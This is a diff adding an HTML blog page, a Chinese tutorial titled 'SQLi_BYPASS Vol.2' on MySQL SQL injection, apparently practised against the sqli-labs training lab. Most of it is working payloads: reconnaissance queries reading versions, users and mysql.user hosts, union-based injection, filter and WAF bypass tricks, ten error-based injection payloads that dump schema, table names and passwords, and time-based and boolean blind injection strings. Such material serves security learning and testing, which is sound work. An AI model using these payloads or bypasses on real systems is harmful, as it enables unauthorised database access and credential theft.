@@ -1,0 +1,159 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>💉 SQLi_BYPASS Vol.2 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">💉 SQLi_BYPASS Vol.2</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>23 Minutes</li><li><i class="icon icon-calendar"></i>February 5, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="💉-SQLi-BYPASS-Vol-2"><a href="#💉-SQLi-BYPASS-Vol-2" class="headerlink" title="💉 SQLi_BYPASS Vol.2"></a><center>💉 SQLi_BYPASS Vol.2</center></h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li>情报收集</li>
+<li>注入 BYPASS 入门</li>
+<li>报错注入</li>
+<li>盲注<ul>
+<li>时间盲注</li>
+<li>布尔盲注</li>
+</ul>
+</li>
+</ul>
+<h3 id="🎙️-0x00-前言"><a href="#🎙️-0x00-前言" class="headerlink" title="🎙️ 0x00 前言"></a>🎙️ 0x00 前言</h3><p>接着上一篇继续。</p>
+<h3 id="0x15-数据库情报收集"><a href="#0x15-数据库情报收集" class="headerlink" title="0x15 数据库情报收集"></a>0x15 数据库情报收集</h3><h4 id="数据库版本与路径信息收集"><a href="#数据库版本与路径信息收集" class="headerlink" title="数据库版本与路径信息收集"></a>数据库版本与路径信息收集</h4><p>收集数据库的版本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line"></span><br><span class="line">/*!版本号*/</span><br><span class="line">/*!*/ 意为在 xxx 版本之上进行</span><br></pre></td></tr></table></figure>
+
+<p><code>select * from admin union select 1,version(),3;</code></p>
+<p><code>select * from admin union select 1,@@version,3;</code></p>
+<p><code>select * from admin union select 1,/*!40000 user()*/,3;</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.01.05.jpg" alt="Screenshot 2020-02-15 下午5.01.05"></p>
+<p>路径一般用 <code>@@datadir</code>，然后可以反猜网站的路径。操作系统可以用 <code>@@version_compile_os</code> 来猜解。</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.04.441.jpg" alt="Screenshot 2020-02-15 下午5.04.44"></p>
+<h4 id="用户、连接信息"><a href="#用户、连接信息" class="headerlink" title="用户、连接信息"></a>用户、连接信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system_user() 系统用户名</span><br><span class="line">user() 	用户名</span><br><span class="line">current_user() 当前用户名</span><br><span class="line">session_user() 连接数据库的用户名</span><br></pre></td></tr></table></figure>
+
+<p><code>select * from admin union select system_user(),current_user(),session_user();</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.09.14.jpg" alt="Screenshot 2020-02-15 下午5.09.14"></p>
+<h4 id="读取-host-信息及-user-信息"><a href="#读取-host-信息及-user-信息" class="headerlink" title="读取 host 信息及 user 信息"></a>读取 host 信息及 user 信息</h4><p><code>select * from admin where id=1 union select 1,host,user from mysql.user;</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.14.33.jpg" alt="Screenshot 2020-02-15 下午5.14.33"></p>
+<p>这里用到了上一篇中讲到的 mysql 库，其中包含了 user/host/password 等信息。</p>
+<p>⚠️ <strong>注意</strong></p>
+<p>通过 host 登录这个信息还可以判断该站是否是站库分离等等。</p>
+<h3 id="0x16-注入-BYPASS-入门"><a href="#0x16-注入-BYPASS-入门" class="headerlink" title="0x16 注入 BYPASS 入门"></a>0x16 注入 BYPASS 入门</h3><h4 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h4><p>针对 sqli-labs lesson1 来练习。</p>
+<p>一开始的套路其实都差不多，先尝试单引号 <code>&#39;</code>，反斜杠 <code>\</code> 等符号报错，然后 <code>and 1=1</code>/<code>and &#39;1&#39;=&#39;1</code>、<code>and 1=2</code>/<code>and &#39;1&#39;=&#39;2</code>，看回显是否有报错。</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.01.01.jpg" alt="Screenshot 2020-02-16 下午6.01.01"></p>
+<p>我们先来看报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code> 表示最外层出错的语句，所以我们应该看的是 <code>&#39;1&#39;&#39; LIMIT 0,1</code>，说明单引号没有闭合造成了出错，同时我们也知道了这条语句后面还有个 <code>limit 0,1</code> 表示从第 0 行开始只显示一行。</p>
+<p>从得到的信息我们可以反推大概的语句可能是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xx from xx where xx=&apos;?id&apos; limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p>接着 order by 判断列数，因为 order by 这个语句本来就是依照第几列来排序，如果超出了列数自然也就会报错，得到列数为 3。</p>
+<p>判断出列数之后就直接上 union select 联合查询。</p>
+<p><code>?id=-1&#39; union select 1,database(),user() limit 0,1 -- +</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.11.52.jpg" alt="Screenshot 2020-02-16 下午6.11.52"></p>
+<p>然后按之前的步骤进行情报收集、dump 数据。</p>
+<p><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 limit 0,1 -- +</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.16.31.jpg" alt="Screenshot 2020-02-16 下午6.16.31"></p>
+<p><code>group_concat()</code> 函数使查询的内容以字符串返回，<code>0x7c</code> hex 解码得到 <code>|</code>，路径位置 hex 编码避免单引号。</p>
+<h5 id="🚨-BYPASS"><a href="#🚨-BYPASS" class="headerlink" title="🚨 BYPASS"></a>🚨 BYPASS</h5><ol>
+<li><p>如果 <code>group_concat()</code> 函数被过滤，我们可以用其他函数来代替，可以查阅 mysql 函数表。</p>
+</li>
+<li><p>通过 <code>limit 0,1</code> 来控制前端显示的数据，如果目标过滤了逗号，可以用 <code>limit 1 offset 0</code> 来控制。或者 join 分页。</p>
+</li>
+<li><p>如果想要爆当前数据库的表，也可以构造成 <code>table_schema=database()</code>。避免单引号推荐使用 hex 编码。</p>
+</li>
+<li><p>如果 <code>information_schema.schemata</code> 被拦截了，可以用别的方式绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`information_schema`.`schemata `  </span><br><span class="line">information_schema/**/.schemata</span><br><span class="line">information_schema/*!*/.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果 users 表被拦截，同理也用这个方法绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security.`users`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="0x17-报错注入"><a href="#0x17-报错注入" class="headerlink" title="0x17 报错注入"></a>0x17 报错注入</h3><p>在不能使用 union select 联合查询的时候，报错注入是非常重要的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+<p>每个报错语句都有它本身的报错原理。</p>
+<p>比如 <code>exp()</code> 报错的原理，<code>exp()</code> 是一个数学函数，取 e 的 x 次方，当我们输入的值大于 709 就会报错，然后 ~ 取反它的值总会大于 709 所以报错。</p>
+<p>利用报错语句来注入，这里利用 <code>updatexml()</code> 来演示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: 是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
+
+<p><code>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></p>
+<p>其中关键点是 <code>XPath_string</code>，因为我们传入的不是 <code>XPath_string</code>。为什么要用 <code>concat()</code> 函数呢，因为它是一个连接函数，如果不用的话：<code>(updatexml(1,(select user()),1))</code> 这样也可以，但是需要字符中有特殊字符才会报错，同时它会被中间的特殊字符截断，所以需要用到 <code>concat()</code> 函数用特殊字符连接起来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 猜解库</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">// 猜解表</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (table_name),0x7e) FROM information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) -- +</span><br><span class="line"></span><br><span class="line">// 猜解列</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (column_name),0x7e) FROM information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1),1) -- +</span><br><span class="line"></span><br><span class="line">// 猜解数据</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (password),0x7e) FROM security.users where username=0x44756d62 limit 0,1),1) -- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.02.15.jpg" alt="Screenshot 2020-02-16 下午7.02.15"></p>
+<center>猜解库名</center>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.07.54.jpg" alt="Screenshot 2020-02-16 下午7.07.54"></p>
+<center>猜解表名</center>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.10.21.jpg" alt="Screenshot 2020-02-16 下午7.10.21"></p>
+<center>猜解列名</center>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.16.15.jpg" alt="Screenshot 2020-02-16 下午7.16.15"></p>
+<center>爆破数据</center>
+
+<p>在报错中直接使用 mysql 最基本的查表就可以了，也可以把 concat 放在外面：<code>updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</code></p>
+<p>⚠️ 值得注意的是加了连接字符 md5 只能爆出 31 位，这里可以用分割函数分割出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.232.140/sqli-labs/Less-1/?id=1&apos; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>
+
+<p>这里利用 md5 加密来分割。</p>
+<h3 id="0x18-盲注"><a href="#0x18-盲注" class="headerlink" title="0x18 盲注"></a>0x18 盲注</h3><p>盲注这里归纳为<strong>时间盲注</strong>和<strong>布尔盲注</strong>。</p>
+<p>盲注的本质是<strong>猜解</strong>：所谓「盲」就是在看不到返回数据的情况下通过「感觉」来判断，那么怎么感觉呢？就是「差异」。包括运行时间的差异和页面返回结果的差异分为时间盲注和布尔盲注。</p>
+<p>在如今的真实环境中盲注的情况比较多，但是时间盲注太费时间，同时对网络的要求比较高。二分、dnslog 等等都可以加快注入的过程。</p>
+<h4 id="⚠️-盲注中需要注意的问题"><a href="#⚠️-盲注中需要注意的问题" class="headerlink" title="⚠️ 盲注中需要注意的问题"></a>⚠️ 盲注中需要注意的问题</h4><ol>
+<li>盲注中使用 and 需要确定查询的值是存在的。</li>
+<li>在返回多组数据的情况下，延时不再是单纯的 <code>sleep(5)</code>，程序将根据返回的数据条数来反复执行。</li>
+<li>尽量搜索存在且数目较少的关键词。</li>
+<li>尽量不要使用 or。</li>
+</ol>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>盲注是通过返回数据的时间来判断 payload 中的内容是否正确。</p>
+<p>时间盲注也叫延时注入，一般用到函数 <code>sleep()</code> <code>BENCHMARK()</code>函数。还可以使用笛卡尔积（尽量不要使用，内容太多会很慢很慢）。</p>
+<p><strong>一般时间盲注还需要使用条件判断函数。</strong></p>
+<p>建议把分割的函数编码一下，这样可以避免使用引号，常用到的有 <code>ascii()</code> <code>hex()</code>等等。</p>
+<p><code>benchmark()</code> 的作用是来测试一些函数的执行速度。<code>benchmark()</code> 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。</p>
+<p>从最简单的盲注开始：</p>
+<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 判断当前用户的用户名，从第一位开始</span><br><span class="line">mysql&gt; select * from users where id=1 and if((substr((select user()),1,1)=&apos;r&apos;),sleep(5),id=1);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%889.42.58.jpg" alt="Screenshot 2020-02-16 下午9.42.58"></p>
+<h5 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark()"></a>benchmark()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 判断当前用户的用户名前两位</span><br><span class="line">mysql&gt; select * from users where id=1 and if((substr((select user()),1,2)=&apos;ro&apos;),benchmark(20000000,md5(&apos;a&apos;)),id=1);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%889.54.09.jpg" alt="Screenshot 2020-02-16 下午9.54.09"></p>
+<h5 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a>case when then else end</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 判断当前用户的用户名</span><br><span class="line">mysql&gt; select * from users where id=1 and case when (substr((select user()),1,4)=&apos;root&apos;) then sleep(5) else id=1 end;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.03.30.jpg" alt="Screenshot 2020-02-16 下午10.03.30"></p>
+<p>不推荐使用笛卡尔积，当数据过多时会造成 DDOS。</p>
+<h5 id="🚨-BYPASS-1"><a href="#🚨-BYPASS-1" class="headerlink" title="🚨 BYPASS"></a>🚨 BYPASS</h5><p>必须要使用到 or 的延时注入不如试试子查询，只延时 5s。</p>
+<p><code>?id=1&#39; or if((substr((select user()),1,4)=&#39;root&#39;),(select sleep(5) from information_schema.schemata as b),1); -- +</code></p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>盲注的思路很多，比如正则匹配、比较函数、运算符等等。</p>
+<p><code>?id=1&#39; and payload -- +</code></p>
+<p>布尔盲注的原理是如果 and 两边都为真，则正常返回数据，如果其中一边为假，则查询不到数据。</p>
+<p><code>select * from users where id=1 and 0;</code></p>
+<p><code>select * from users where id=1 and 1;</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.26.55.jpg" alt="Screenshot 2020-02-16 下午11.26.55"></p>
+<p>参考：<a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170626</a></p>
+<h5 id="字符串截取对比"><a href="#字符串截取对比" class="headerlink" title="字符串截取对比"></a>字符串截取对比</h5><p>类似的函数还有很多。</p>
+<p><code>?id=1&#39; and substr((select user()),1,4)=&#39;root&#39; -- +</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.16.33.jpg" alt="Screenshot 2020-02-16 下午10.16.33"></p>
+<center>返回正常，用户名为 root</center>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.17.13.jpg" alt="Screenshot 2020-02-16 下午10.17.13"></p>
+<center>没有回显，用户名不是 user</center>
+
+<h5 id="ifnull-函数"><a href="#ifnull-函数" class="headerlink" title="ifnull() 函数"></a>ifnull() 函数</h5><p><code>ifnull()</code> 函数有两个参数，该函数判断第一个表达式是否为 NULL（0），如果为 NULL（0），则返回第二个参数的值，否则返回第一个参数的值。</p>
+<p>⚠️ 注意</p>
+<p>但是这里实测发现，<code>ifnull()</code> 函数判断第一个值，如果为真则返回 1，否则返回 0，不会返回第二个值，这里记录一下。</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.23.33.jpg" alt="Screenshot 2020-02-16 下午11.23.33"></p>
+<p><code>?id=1&#39; and ifnull((substr((select user()),1,4)=&#39;root&#39;),0) -- +</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.40.21.jpg" alt="Screenshot 2020-02-16 下午10.40.21"></p>
+<h5 id="比较函数-strcmp"><a href="#比较函数-strcmp" class="headerlink" title="比较函数 strcmp()"></a>比较函数 strcmp()</h5><p><code>strcmp()</code> 函数有两个参数，STRCMP(expr1,expr2)，如果两个字符串相同，则返回 0，如果第一个参数根据当前排序顺序小于第二个参数，则返回 -1，否则返回 1。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 实例</span><br><span class="line">SELECT strcmp(123, 123);        # 0</span><br><span class="line">SELECT strcmp(123, 122);        # 1</span><br><span class="line">SELECT strcmp(123, 124);        # -1</span><br><span class="line"></span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abc&apos;);    # 0</span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abb&apos;);    # 1</span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abd&apos;);    # -1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 如果用户名是root，则返回1，1大于0返回1，and两边为1，正常返回数据</span><br><span class="line">?id=1 and strcmp((substr((select user()),1,4)=&apos;root&apos;),0) -- +</span><br><span class="line"></span><br><span class="line">// 如果用户名不是toor，则返回0，0等于0返回0，查询不到数据</span><br><span class="line">?id=1 and strcmp((substr((select users()),1,4)=&apos;toor&apos;),0) -- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.31.21.jpg" alt="Screenshot 2020-02-16 下午11.31.21"></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.31.34.jpg" alt="Screenshot 2020-02-16 下午11.31.34"></p>
+</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck6xmam3p000lelozf56uj93i" data-title="💉 SQLi_BYPASS Vol.2" data-url="http://www.naykcin.top/2020/02/05/sqlibypass2/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+var duoshuoQuery = {short_name: siteName};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+  || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/02/06/sqlibypass3/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2020/02/04/sqlibypass/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
+window.onload = function () {
+  wrap.className += ' done';
+}</script></body></html>
